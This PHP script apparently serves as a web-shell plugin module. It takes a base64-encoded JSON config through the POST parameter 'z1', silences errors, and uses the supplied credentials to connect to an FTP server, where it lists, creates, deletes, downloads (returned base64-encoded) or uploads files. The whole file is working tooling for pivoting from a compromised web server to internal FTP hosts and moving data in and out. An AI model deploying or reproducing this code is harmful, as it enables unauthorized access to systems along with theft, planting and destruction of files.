<?php

@error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

class FtpExplorer {
    private $ip;
    private $port;
    private $user;
    private $pass;
    private $timeout;

    public function __construct($ip, $port, $user, $pass, $timeout) {
        $this->ip = $ip;
        $this->port = $port;
        $this->user = $user;
        $this->pass = $pass;
        $this->timeout = $timeout > 0 ? $timeout : 10;
    }

    public function do_action($action, $remote_path, $json) {
        if (empty($action))
            $action = 'list';

        switch (strtolower($action)) {
            case 'list':
                return $this->list_directory($remote_path);
            case 'mkdir':
                return $this->make_directory($remote_path);
            case 'delete':
                return $this->delete_file_or_dir($remote_path);
            case 'download':
            case 'read':
                return $this->download_file($remote_path);
            case 'upload':
                $file_b64content = isset($json['content']) ? $json['content'] : '';
                return $this->upload_file($remote_path, $file_b64content);
            default:
                return '[-] Error: unknown action: ' . $action;
        }
    }

    private function list_directory($remote_path) {
        $conn = @ftp_connect($this->ip, $this->port, $this->timeout);
        if (!$conn) {
            return "[-] Failed to connect to FTP server {$this->ip}:{$this->port}";
        }

        if (!@ftp_login($conn, $this->user, $this->pass)) {
            @ftp_close($conn);
            return "[-] FTP authentication failed for user: {$this->user}";
        }

        @ftp_pasv($conn, true);
        $contents = @ftp_rawlist($conn, $remote_path);
        @ftp_close($conn);

        if ($contents === false) {
            return "[-] Failed to list directory {$remote_path}";
        }

        $result = implode("\n", $contents);
        return "[+] SUCCESS_LIST\n" . $result;
    }

    private function make_directory($remote_path) {
        $conn = @ftp_connect($this->ip, $this->port, $this->timeout);
        if (!$conn) {
            return "[-] Failed to connect to FTP server {$this->ip}:{$this->port}";
        }

        if (!@ftp_login($conn, $this->user, $this->pass)) {
            @ftp_close($conn);
            return "[-] FTP authentication failed for user: {$this->user}";
        }

        @ftp_pasv($conn, true);
        $success = @ftp_mkdir($conn, $remote_path);
        @ftp_close($conn);

        if (!$success) {
            return "[-] Failed to create directory {$remote_path}";
        }

        return "[+] SUCCESS_MKDIR -> Directory was created: {$remote_path}";
    }

    private function delete_file_or_dir($remote_path) {
        $conn = @ftp_connect($this->ip, $this->port, $this->timeout);
        if (!$conn) {
            return "[-] Failed to connect to FTP server {$this->ip}:{$this->port}";
        }

        if (!@ftp_login($conn, $this->user, $this->pass)) {
            @ftp_close($conn);
            return "[-] FTP Authentication failed for user: {$this->user}";
        }

        @ftp_pasv($conn, true);
        
        $success = @ftp_delete($conn, $remote_path);
        if (!$success) {
            $success = @ftp_rmdir($conn, $remote_path);
        }

        @ftp_close($conn);

        if (!$success) {
            return "[-] Failed to delete {$remote_path}";
        }

        return "[+] SUCCESS_DELETE -> Removed: {$remote_path}";
    }

    private function download_file($remote_path) {
        $conn = @ftp_connect($this->ip, $this->port, $this->timeout);
        if (!$conn) {
            return "[-] Failed to connect to FTP server {$this->ip}:{$this->port}";
        }

        if (!@ftp_login($conn, $this->user, $this->pass)) {
            @ftp_close($conn);
            return "[-] FTP Authentication failed for user: {$this->user}";
        }

        @ftp_pasv($conn, true);
        
        $tempStream = fopen('php://temp', 'r+');
        if (@ftp_fget($conn, $tempStream, $remote_path, FTP_BINARY)) {
            rewind($tempStream);
            $fileBytes = stream_get_contents($tempStream);
            fclose($tempStream);
            @ftp_close($conn);

            $base64Data = base64_encode($fileBytes);
            return "[+] SUCCESS_DOWNLOAD\n" . $base64Data;
        }

        fclose($tempStream);
        @ftp_close($conn);
        return "[-] Failed to download file {$remote_path}";
    }

    private function upload_file($remote_path, $base64_content) {
        if (empty($base64_content)) {
            return "[-] Failed to upload: File content is empty.";
        }

        $fileBytes = base64_decode($base64_content);
        if ($fileBytes === false) {
            return "[-] Failed to upload: Invalid Base64 content.";
        }

        $conn = @ftp_connect($this->ip, $this->port, $this->timeout);
        if (!$conn) {
            return "[-] Failed to connect to FTP server {$this->ip}:{$this->port}";
        }

        if (!@ftp_login($conn, $this->user, $this->pass)) {
            @ftp_close($conn);
            return "[-] FTP Authentication failed for user: {$this->user}";
        }

        @ftp_pasv($conn, true);

        $tempStream = fopen('php://temp', 'r+');
        fwrite($tempStream, $fileBytes);
        rewind($tempStream);

        $success = @ftp_fput($conn, $remote_path, $tempStream, FTP_BINARY);
        fclose($tempStream);
        @ftp_close($conn);

        if (!$success) {
            return "[-] Failed to upload file {$remote_path}";
        }

        return "[+] SUCCESS_UPLOAD -> File uploaded successfully: {$remote_path}";
    }
}

function main() {
    try {
        $z1 = $_POST['z1'];
        if (empty($z1)) {
            return '[-] Missing parameter z1';
        }

        $decoded = base64_decode($z1, true);
        $config = json_decode(($decoded !== false ? $decoded : $z1), true);
        
        if (!is_array($config)) {
            return '[-] Invalid configuration format';
        }

        $ip = isset($config['ip']) ? $config['ip'] : '';
        $port = isset($config['port']) ? (int)$config['port'] : 21;
        $user = isset($config['user']) ? $config['user'] : '';
        $pass = isset($config['pass']) ? $config['pass'] : '';
        $action = isset($config['action']) ? $config['action'] : '';
        $remote_path = isset($config['path']) ? $config['path'] : '/';
        $timeout = isset($config['timeout']) ? (int)$config['timeout'] : 10;
        
        if (empty($remote_path))
            $remote_path = '/';

        $manager = new FtpExplorer($ip, $port, $user, $pass, $timeout);
        return $manager->do_action($action, $remote_path, $config);

    } catch (Exception $ex) {
        return '[-] ' . $ex->getMessage();
    }
}

echo(main());

?>